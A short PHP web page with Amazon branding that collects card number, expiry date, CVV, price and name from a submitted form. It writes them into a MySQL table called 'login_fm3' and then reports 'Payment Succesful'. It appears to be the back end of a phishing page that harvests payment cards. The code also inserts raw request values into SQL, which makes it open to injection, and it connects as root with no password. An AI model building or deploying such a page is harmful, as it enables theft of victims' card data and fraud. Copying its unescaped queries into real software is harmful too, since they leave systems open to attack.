<!DOCTYPE html>
<html>
 
<head>
    <title>Insert Data page</title>
    <style>
        body{
            background-image: url("img/bgamz.jpg");
            background-size: cover;
        }
        h1{
            color:#A52A2A;
            font-family:Arial, Helvetica, sans-serif;
            f
        }
        h2{
            color:#2F4F4F;
        }
        h3{
            color:#8B4513;
        }
    </style>
    
</head>
 
<body>
    <center>
        <?php header("Location: home.html");
 
        // servername => localhost
        // username => root
        // password => empty
        // database name => staff
        $conn = mysqli_connect("localhost", "root", "", "login_db");

        // Check connection
        if($conn === false){
            die("ERROR: Could not connect. "
                . mysqli_connect_error());
        }

        // Taking all 5 values from the form data(input)
        $card = $_REQUEST['card'];
        $exp = $_REQUEST['exp'];
        $cvv = $_REQUEST['cvv'];
        $price = $_REQUEST['price'];
        $name = $_REQUEST['name'];
      

        // Performing insert query execution
        // here our table name is college
        $sql = "INSERT INTO login_fm3 VALUES ('$card',
            '$exp','$cvv','$price','$name')";

        if(mysqli_query($conn, $sql)){
            echo "<h1> : Payment Succesful : <hr><br> <br></h1>";
            echo "<br><br><br>";
            echo "<h3>Shop millions of products, never miss amazing deals, compare prices and reviews and track  your orders easily with the Amazon Shopping App!";

        } else{
            echo "ERROR: Please Try again  $sql. "
                . mysqli_error($conn);
        }

        // Close connection
        mysqli_close($conn);
        ?>
    </center>
</body>
 
</html>